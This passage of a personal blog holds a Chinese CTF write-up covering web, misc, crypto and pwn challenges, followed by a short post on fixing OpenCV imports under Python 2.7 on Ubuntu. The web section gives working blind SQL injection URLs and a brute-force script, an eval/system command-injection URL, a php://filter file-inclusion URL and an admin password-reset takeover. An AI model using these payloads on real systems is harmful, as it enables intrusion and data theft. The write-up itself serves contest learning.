<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">"f2f86a5c7e623b54e4685fcc8c503596.php"</span>); </span><br><span class="line">$UN=@$_GET[<span class="string">'un'</span>]; </span><br><span class="line">$CTF=@$_POST[<span class="string">'ctf'</span>]; </span><br><span class="line"><span class="keyword">if</span>($UN==<span class="number">0</span> <span class="keyword">and</span> $UN)&#123; </span><br><span class="line">    echo $flag_ahead; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(is_numeric($CTF))&#123; </span><br><span class="line">    exit(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($CTF&gt;<span class="number">87654321</span>)&#123; </span><br><span class="line">    echo $flag_behind; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>源码意思是要同时用get传入un=0且post一个ctf&gt;87654321,可以用0a和空数组截断,构造payload<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="WEB2-100"><a href="#WEB2-100" class="headerlink" title="WEB2  100"></a>WEB2  100</h2><p>上传文件,经过尝试需要上传图片马</p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>御剑扫到file.php,访问看到信息意思大概是NSB的数据库,可以用文件包含读取,进行命令注入</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="NSB-Reset-Password-300"><a href="#NSB-Reset-Password-300" class="headerlink" title="NSB Reset Password  300"></a>NSB Reset Password  300</h2><p>逻辑漏洞,整个过程可以分为reset和login,思路是在数据库中覆盖admin密码</p>
<p>(其实自己做的也很懵,不知道我的过程是不是正确步骤,但是确实做出来了)</p>
<p>先注册一个admin1用户用来接收验证码</p>
<p>reset1找回admin用户的密码,邮件发送成功时,burp抓包改user为admin1</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>admin1用户收到验证码,找回密码处修改admin密码</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>回到登录窗,用admin用户和admin1密码登陆成功</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>过后我没复现出来,可能其中有几步我的别的操作不记得了,做出来后我也很懵</p>
<p>我记得有转换成get让admin用户接收到修改密码的操作,不知道有没有效果</p>
<p>反正坐等官方wp!</p>
<h2 id="光坂镇的小诗1-100"><a href="#光坂镇的小诗1-100" class="headerlink" title="光坂镇的小诗1  100"></a>光坂镇的小诗1  100</h2><p>抓包试出 , 被过滤,还要绕过 \ </p>
<p>转义字符可以用 <code>%df%5c</code> 绕过,逗号可以用 <code>case</code> <code>when()</code> <code>then()</code> <code>else()</code> <code>end</code> 函数绕过</p>
<p>于是构造payload,根据回显判断真假,读出两个表 flag img</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(<span class="keyword">case</span>%20when(ord(mid((select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()%20)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23</span><br></pre></td></tr></table></figure>
<p>再构造payload从表里读flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(<span class="keyword">case</span>%20when(ord(mid((select%20group_concat(flag)from%20flag)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23</span><br></pre></td></tr></table></figure></p>
<p>在网上随便找了个盲注脚本当注入模板,修修改改……<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(case%20when(ord(mid((select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()%20)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23"</span></span><br><span class="line">        res = requests.get(url.format(i,k))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'img'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">print</span> chr(k)</span><br></pre></td></tr></table></figure></p>
<p>最后跑出 flag{q22!sa_web_sql_2245y2g44h}</p>
<h2 id="光坂镇的小诗2-200"><a href="#光坂镇的小诗2-200" class="headerlink" title="光坂镇的小诗2  200"></a>光坂镇的小诗2  200</h2><p>这题依旧可以用sqlmap跑出来</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>FLAG{Q2GGHA_WEB_SQL_22JKK44H}</p>
<h2 id="阿风日记-docx-100"><a href="#阿风日记-docx-100" class="headerlink" title="阿风日记.docx  100"></a>阿风日记.docx  100</h2><p>又是一道跑字典的题,burp抓包,这次跑的是弱密码</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="easyphp-100"><a href="#easyphp-100" class="headerlink" title="easyphp  100"></a>easyphp  100</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a = @$_GET[<span class="string">'x'</span>];</span><br><span class="line">    <span class="keyword">if</span>(substr_count($a,<span class="string">"("</span>)&gt;<span class="number">1</span> || substr_count($a,<span class="string">")"</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        die(<span class="string">"only one fun"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strpos($a, <span class="string">'$_GET'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">'$_POST'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">'$_COOKIE'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">"*"</span>!==<span class="literal">False</span>))&#123;</span><br><span class="line">        die(<span class="string">"No No No"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $left = strpos($a, <span class="string">"("</span>);</span><br><span class="line">    $right = strpos($a, <span class="string">")"</span>);</span><br><span class="line">    $len = $right-$left;</span><br><span class="line">    $cmd = substr($a,$left+<span class="number">2</span>,$len<span class="number">-3</span>);</span><br><span class="line">    <span class="keyword">if</span>(strpos($cmd, <span class="string">"cat"</span>)!==<span class="number">0</span> &amp;&amp; strpos($cmd,<span class="string">"cat"</span>)!==<span class="number">1</span> &amp;&amp; strpos($a, <span class="string">"cat"</span>)!== <span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($cmd)&gt;<span class="number">13</span>)</span><br><span class="line">        &#123;        </span><br><span class="line">            die(<span class="string">"too long"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            echo eval($a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>审计发现eval()函数存在命令执行,需要给x赋值,执行system()函数,并且用%20%20绕过前面的算法,构造payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10043/index.php?x=system(%27%20%20cat%20php%20f*%20%27);</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="这好像不是上传"><a href="#这好像不是上传" class="headerlink" title="这好像不是上传"></a>这好像不是上传</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8003/index.php?filename=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure>
<p>可以用php伪协议读源码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($filename,<span class="string">"../"</span>)||stristr($filename, <span class="string">"tp"</span>)||stristr($filename,<span class="string">"input"</span>)||stristr($filename,<span class="string">"data"</span>))&#123;</span><br><span class="line">		echo <span class="string">"hacker!"</span>;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($filename,<span class="string">"phar://"</span>))&#123;</span><br><span class="line">		echo <span class="string">"这个函数太危险了,还不能给你用,upload.php也许可以把?也不知道他藏了什么东西在他那里面..."</span>;</span><br><span class="line">		exit();</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($filename,<span class="string">".txt"</span>))&#123;</span><br><span class="line">		echo <span class="string">"这个我做不到,也许upload.php可以帮你,也不知道他藏了什么东西在他那里面..."</span>;</span><br><span class="line">		exit();</span><br><span class="line">                &#125;</span><br><span class="line">    include($filename); </span><br><span class="line">    ?&gt;</span><br><span class="line"><span class="comment"># upload.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str = <span class="string">"你终于找到了啊"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $upload_name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $tempfile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $upload_ext = trim(get_extension($upload_name));</span><br><span class="line"> </span><br><span class="line">    $savefile = <span class="string">'./upload/'</span>.md5(time()).<span class="string">'.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span> ($upload_ext == <span class="string">'txt'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(move_uploaded_file($tempfile,$savefile)) &#123;</span><br><span class="line">                die(<span class="string">'Success upload. FileName: '</span>.$savefile);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                die(<span class="string">'Upload failed..'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die(<span class="string">'this is not a txt file..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function get_extension($file)&#123;</span><br><span class="line">    <span class="keyword">return</span> strtolower(substr($file, strrpos($file, <span class="string">'.'</span>)+<span class="number">1</span>));   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">''</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">"%s.php"</span>, $file); // 只有php才能被包含</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#something.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$str  = <span class="string">"看我干嘛,我真的啥也没有."</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>LFI漏洞,暂时没复现出来,也没有成功连接后台,唉!</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="快乐游戏题-100"><a href="#快乐游戏题-100" class="headerlink" title="快乐游戏题  100"></a>快乐游戏题  100</h2><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>van就完事了,上课时候做的,只来得及拍照</p>
<h2 id="亲爱的-100"><a href="#亲爱的-100" class="headerlink" title="亲爱的  100"></a>亲爱的  100</h2><p>完全没想到居然是道社工题,改后缀zip后注释是这个歌在qq音乐2019.7.27 17:47的评论</p>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>解压得到图片,改后缀zip解压,在word/media目录下看到flag文件</p>
<figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>UNCTF{W3_L0v3_Unctf}</p>
<h2 id="长安十二时辰-200"><a href="#长安十二时辰-200" class="headerlink" title="长安十二时辰  200"></a>长安十二时辰  200</h2><figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>根据这张图读出ascil码,脚本解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ascil码转字符串或解base64</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line">a=<span class="string">'117 102 115 115 95 121 110 123 99 95 101 125 99 109 95 115 97 116 49 49 48 53'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># print flag.decode('base64')</span></span><br></pre></td></tr></table></figure>
<p>得到  ufss_yn{c_e}cm_sat1105<br>再进行栅栏密码解密,提交里面的字符串</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="贝斯的图-100"><a href="#贝斯的图-100" class="headerlink" title="贝斯的图  100"></a>贝斯的图  100</h2><p>在线base64转码图片,得到二维码,扫描得到base64编码,解码得到flag</p>
<h2 id="我的头怎么了-100"><a href="#我的头怎么了-100" class="headerlink" title="我的头怎么了  100"></a>我的头怎么了  100</h2><p>修复gif文件头  474946383961</p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>要提交半角符号  hhh_it‘s_ea5y</p>
<h2 id="unctf-平淡日子下面的秘密-100"><a href="#unctf-平淡日子下面的秘密-100" class="headerlink" title="unctf_平淡日子下面的秘密  100"></a>unctf_平淡日子下面的秘密  100</h2><p>拖进stegsolve里,帧里藏有假二维码flag</p>
<p>提取lsb,勾选位数后三位0,得到zip压缩包</p>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>用winrar修复后打开flag.txt,密码是在其中的二维码解出来的</p>
<p>Y0u’re_so_smart,but_it’s_not_the_end</p>
<p>得到flag</p>
<h2 id="压缩大礼包-400"><a href="#压缩大礼包-400" class="headerlink" title="压缩大礼包  400"></a>压缩大礼包  400</h2><p>拖进notepad里发现rar头,改后缀解压</p>
<p>第一层在压缩包备注里,复制到winhex里得到新压缩包</p>
<p>第二层是zip伪加密,破解得到和里压缩包相同的rename.txt文件</p>
<p>第三层是明文攻击,用相同crc32文件破解里压缩包</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第四层是crc32碰撞,可以用脚本跑那几个txt文件,试出密码是welc0me_To_7his_un_ctf__</p>
<p>第五层是注释不可见字符,复制到sublime里能看到是摩斯密码,解出来是X233$@F99</p>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第六层是爆破,foremost分离后需要先修复一下,还好密码比较简单8745</p>
<p>第七层flag要解一下base64,得到  unctf{D0_y0U_1!kE_rAR_?}</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="nc-100"><a href="#nc-100" class="headerlink" title="nc  100"></a>nc  100</h2><p>输的足够多就溢出了</p>
<figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="BABYRSA-300"><a href="#BABYRSA-300" class="headerlink" title="BABYRSA  300"></a>BABYRSA  300</h2><p>根据文件套rsa解密模板写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag = open('flag.txt','r').read()</span></span><br><span class="line"><span class="comment"># N = 221</span></span><br><span class="line"><span class="comment"># e = 5</span></span><br><span class="line"><span class="comment"># enc = b''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in flag:</span></span><br><span class="line"><span class="comment">#     enc += bytes([pow(ord(i),e,N)])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt = open('encrypt','wb')</span></span><br><span class="line"><span class="comment"># encrypt.write(enc)</span></span><br><span class="line"><span class="comment"># encrypt.close()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">	N=<span class="number">221</span></span><br><span class="line">	e=<span class="number">5</span></span><br><span class="line">	encrypt=open(<span class="string">'encrypt'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">	dic=<span class="string">'''1234567890~`!@#$%^&amp;*()_+-=[]&#123;&#125;;:'"|\,&lt;.&gt;/?qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP'''</span></span><br><span class="line">	flag=<span class="string">''</span></span><br><span class="line">	length=len(encrypt)</span><br><span class="line">	num=<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> encrypt:</span><br><span class="line">		j=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">			<span class="keyword">if</span>((pow(ord(dic[k]),e,N))==i):</span><br><span class="line">				flag+=dic[k]</span><br><span class="line">				j=<span class="number">1</span></span><br><span class="line">		num+=<span class="number">1</span></span><br><span class="line">	print(flag)</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>
<p>执行得到flag<br><figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<h2 id="bacon-100"><a href="#bacon-100" class="headerlink" title="bacon  100"></a>bacon  100</h2><p>放脚本里跑,第二种解密结果是对的</p>
<figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>md5后是  2b95d1f09b8b66c5c43622a4d9ec9a04</p>
<h2 id="云深不知处-100"><a href="#云深不知处-100" class="headerlink" title="云深不知处 100"></a>云深不知处 100</h2><p>云影密码(01248),以0为间隔分割,每组数字相加对应的a-z字母,md5后为flag</p>
<figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="安妮起源-200"><a href="#安妮起源-200" class="headerlink" title="安妮起源  200"></a>安妮起源  200</h2><p>第一层选择愿意,解出猪圈密码:cubismine</p>
<p>第二层是摩斯密码,解出:magicalmorsecode</p>
<p>第三层是银河密码,解出:helloctfer</p>
<figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>F1ame_i5_My_f4vorite_t0y</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python2.7 ubuntu解决import cv2问题]]></title>
      <url>/%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/ckwd5ws9c004sd0uc4xszl021/</url>
      <content type="html"><![CDATA[<p>在做BlindWaterMark(盲水印破解)题时一直用不了cv2库,这个在以前的情况也遇到过,当时能力不足,整不了这个问题,现在可以完美解决了,这篇文章就记录一下我的解决过程</p>
<h2 id="问题的开始"><a href="#问题的开始" class="headerlink" title="问题的开始"></a>问题的开始</h2><p>在我运行python程序时,首先出现没有cv2模板的报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ Damyayayayaya in ~ [19:05:05] </span></span><br><span class="line">$ python2 bwm.py decode 1.png problem.png true.png</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"bwm.py"</span>, line 55, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import cv2</span><br><span class="line">ImportError: No module named cv2</span><br></pre></td></tr></table></figure></p>
<p>然后新服务器里没有pip,又安装一个<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># pip install cv2</span></span><br><span class="line">Command <span class="string">'pip'</span> not found, but can be installed with:</span><br><span class="line">apt install python-pip</span><br><span class="line">root@Damyayayayaya:~<span class="comment"># apt install python-pip</span></span><br></pre></td></tr></table></figure></p>
<p>安装好pip后,想安装cv2模块报错,于是安装opencv<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># pip install opencv-python</span></span><br></pre></td></tr></table></figure></p>
<p>运行解密代码时报错缺少文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"bwm.py"</span>, line 55, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import cv2</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/cv2/__init__.py"</span>, line 3, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from .cv2 import *</span><br><span class="line">ImportError: libSM.so.6: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></p>
<h2 id="问题的解决"><a href="#问题的解决" class="headerlink" title="问题的解决"></a>问题的解决</h2><p>这时候要先安装一个ubuntu的实用工具apt-file<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install apt-file</span><br><span class="line">apt-file update</span><br></pre></td></tr></table></figure></p>
<p>逐步查找缺少的依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># apt-file search libSM.so.6</span></span><br><span class="line">libsm6: /usr/lib/x86_64-linux-gnu/libSM.so.6</span><br><span class="line">libsm6: /usr/lib/x86_64-linux-gnu/libSM.so.6.0.1</span><br><span class="line">root@Damyayayayaya:~<span class="comment"># apt-get install libsm6</span></span><br></pre></td></tr></table></figure></p>
<p>安装好后再次运行程序,继续缺少依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"bwm.py"</span>, line 55, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import cv2</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/cv2/__init__.py"</span>, line 3, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from .cv2 import *</span><br><span class="line">ImportError: libXrender.so.1: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure></p>
<p>继续安装依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># apt-file search libXrender.so.1</span></span><br><span class="line">libxrender1: /usr/lib/x86_64-linux-gnu/libXrender.so.1</span><br><span class="line">libxrender1: /usr/lib/x86_64-linux-gnu/libXrender.so.1.3.0</span><br><span class="line">root@Damyayayayaya:~<span class="comment"># apt-get install libxrender1</span></span><br></pre></td></tr></table></figure></p>
<p>继续运行程序,继续报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># python bwm.py decode 1.png problem.png true.png</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"bwm.py"</span>, line 57, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import matplotlib.pyplot as plt</span><br><span class="line">ImportError: No module named matplotlib.pyplot</span><br></pre></td></tr></table></figure></p>
<p>继续装模板<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:~<span class="comment"># pip install matplotlib</span></span><br></pre></td></tr></table></figure></p>
